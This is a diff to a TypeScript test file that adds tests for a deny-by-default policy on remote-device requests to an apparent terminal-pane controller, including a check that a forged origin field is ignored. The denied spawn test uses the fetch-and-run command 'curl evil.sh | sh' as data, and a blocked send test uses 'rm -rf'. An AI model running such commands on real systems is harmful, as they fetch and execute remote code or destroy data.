@@ -131,7 +131,9 @@ import { Cmd, PANE_CMD_EVENT, type ControlRequest, type ControlResponse } from "
 import { listClearances, resolveClearance, withdrawClearance, resetClearances } from "../stores/clearances";
 
 const replyInvoke = invoke as unknown as Mock;
-let handler: (event: { payload: { reqId: number; request: string } }) => Promise<void>;
+let handler: (event: {
+  payload: { reqId: number; request: string; origin?: string };
+}) => Promise<void>;
 
 /** Drive a request whose guardrail parks a Clearance: kick it off, answer the Clearance once it
  *  appears, then read the reply. `decide` receives the parked Clearance's id. */
@@ -158,6 +160,18 @@ async function call(request: ControlRequest | string, reqId = 1): Promise<Contro
   const calls = replyInvoke.mock.calls;
   const args = calls[calls.length - 1][1] as { reqId: number; response: string };
   expect(args.reqId).toBe(reqId);
+  return JSON.parse(args.response) as ControlResponse;
+}
+
+/** Drive a request tagged with a remote Origin (ADR-0012 rule 3) — the envelope Rust would author. */
+async function callRemote(
+  request: ControlRequest,
+  origin = "device:phone",
+  reqId = 1,
+): Promise<ControlResponse> {
+  await handler({ payload: { reqId, request: JSON.stringify(request), origin } });
+  const calls = replyInvoke.mock.calls;
+  const args = calls[calls.length - 1][1] as { reqId: number; response: string };
   return JSON.parse(args.response) as ControlResponse;
 }
 
@@ -884,5 +898,74 @@ describe("ask / reply", () => {
     const res = await call({ op: "reply", id: 99, answer: "x" });
     expect(res.ok).toBe(false);
     if (!res.ok) expect(res.error).toMatch(/no open ask #99/);
+  });
+});
+
+describe("remote origin — deny-by-default policy (ADR-0012 rule 3)", () => {
+  it("allows `list` from a device with no prompt", async () => {
+    listPanes.mockReturnValue([{ name: "Faye", workspace: "main", focused: true, paneId: 1 }]);
+    countLive.mockReturnValue(1);
+    const res = await callRemote({ op: "list" });
+    expect(res.ok).toBe(true);
+    expect(listClearances()).toHaveLength(0); // allow = no Clearance
+  });
+
+  it("denies `spawn` from a device — the RCE primitive has no remote surface", async () => {
+    const res = await callRemote({ op: "spawn", command: "curl evil.sh | sh" });
+    expect(res.ok).toBe(false);
+    if (!res.ok) expect(res.error).toMatch(/not permitted from a device/);
+    expect(spawnPane).not.toHaveBeenCalled();
+    expect(listClearances()).toHaveLength(0);
+  });
+
+  it("denies setters (status/attention) that only sound like reads", async () => {
+    const s = await callRemote({ op: "status", target: "Faye", text: "pwned" });
+    expect(s.ok).toBe(false);
+    if (!s.ok) expect(s.error).toMatch(/not permitted/);
+    const a = await callRemote({ op: "attention", target: "Faye" });
+    expect(a.ok).toBe(false);
+  });
+
+  it("closes the gate.set{off}+send bypass — gate.set is denied remotely", async () => {
+    const res = await callRemote({ op: "gate.set", target: "Faye", on: false });
+    expect(res.ok).toBe(false);
+    if (!res.ok) expect(res.error).toMatch(/not permitted/);
+  });
+
+  it("gates `send` behind a Clearance (Flow A Confirmation), and executes on approve", async () => {
+    resolvePaneByName.mockReturnValue({ paneId: 3 });
+    writeToPanes.mockReturnValue(1);
+    const inflight = handler({
+      payload: { reqId: 1, request: JSON.stringify({ op: "send", target: "Faye", text: "deploy" }), origin: "device:phone" },
+    });
+    await vi.waitFor(() => expect(listClearances()).toHaveLength(1));
+    const c = listClearances()[0];
+    expect(c.kind).toBe("remote-command");
+    expect(c.summary).toContain("device:phone");
+    resolveClearance(c.id, true);
+    await inflight;
+    expect(writeToPanes).toHaveBeenCalled();
+  });
+
+  it("a denied Clearance blocks a remote `send`", async () => {
+    resolvePaneByName.mockReturnValue({ paneId: 3 });
+    const inflight = handler({
+      payload: { reqId: 1, request: JSON.stringify({ op: "send", target: "Faye", text: "rm -rf" }), origin: "device:phone" },
+    });
+    await vi.waitFor(() => expect(listClearances()).toHaveLength(1));
+    resolveClearance(listClearances()[0].id, false);
+    await inflight;
+    const res = JSON.parse(
+      (replyInvoke.mock.calls[replyInvoke.mock.calls.length - 1][1] as { response: string }).response,
+    ) as ControlResponse;
+    expect(res.ok).toBe(false);
+    expect(writeToPanes).not.toHaveBeenCalled();
+  });
+
+  it("an `origin` in the request BODY is ignored — only the envelope's origin counts (rule 3.1)", async () => {
+    // A device forging {"origin":"local"} in the body must not escape the policy gate.
+    const res = await callRemote({ op: "spawn", command: "x", origin: "local" } as unknown as ControlRequest);
+    expect(res.ok).toBe(false);
+    if (!res.ok) expect(res.error).toMatch(/not permitted from a device/);
   });
 });
